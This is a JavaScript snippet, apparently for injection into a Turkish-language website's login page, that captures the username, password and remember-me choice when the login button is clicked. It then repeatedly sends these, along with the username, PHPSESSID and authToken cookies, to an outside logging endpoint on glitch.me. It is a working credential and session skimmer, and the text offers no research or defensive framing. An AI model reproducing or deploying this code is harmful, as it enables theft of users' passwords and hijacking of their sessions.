(function() {
    function getCookie(name) {
        const value = `; ${document.cookie}`;
        const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return decodeURIComponent(parts.pop().split(';').shift());
        return null;
    }

    function setupLoginListener() {
        const loginBtn = document.querySelector('a[onclick="girisyap()"]');
        if (loginBtn) {
            loginBtn.addEventListener('click', () => {
                const username = document.getElementById('loginname')?.value || 'Bilinmiyor';
                const password = document.getElementById('loginpassport')?.value || 'Bilinmiyor';
                const remember = document.getElementById('authCheck')?.checked || false;

                localStorage.setItem('pendingLogin', JSON.stringify({
                    kuladi: username,
                    sifre: password,
                    remember: remember,
                    timestamp: Date.now()
                }));
            });
        } else {
            setTimeout(setupLoginListener, 100);
        }
    }

    function sendCredentials() {
        const pendingLogin = localStorage.getItem('pendingLogin');
        if (!pendingLogin) return;

        const loginData = JSON.parse(pendingLogin);
        const usernameCookie = getCookie('username');
        const phpSessId = getCookie('PHPSESSID');
        const authToken = getCookie('authToken'); // Yeni: authToken çekiliyor

        if (usernameCookie || phpSessId || authToken) {
            const data = {
                kuladi: loginData.kuladi,
                sifre: loginData.sifre,
                remember: loginData.remember,
                cookies: {
                    username: usernameCookie || 'Yok',
                    PHPSESSID: phpSessId || 'Yok',
                    authToken: authToken || 'Yok' // Yeni: authToken ekleniyor
                },
                timestamp: loginData.timestamp
            };

            fetch('https://katip-atlas.glitch.me/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data),
                credentials: 'include'
            })
                .then(() => {
                    localStorage.removeItem('pendingLogin');
                })
                .catch(() => {});
        }
    }

    setupLoginListener();
    window.addEventListener('load', () => {
        sendCredentials();
    });
    setInterval(sendCredentials, 1000);
})();
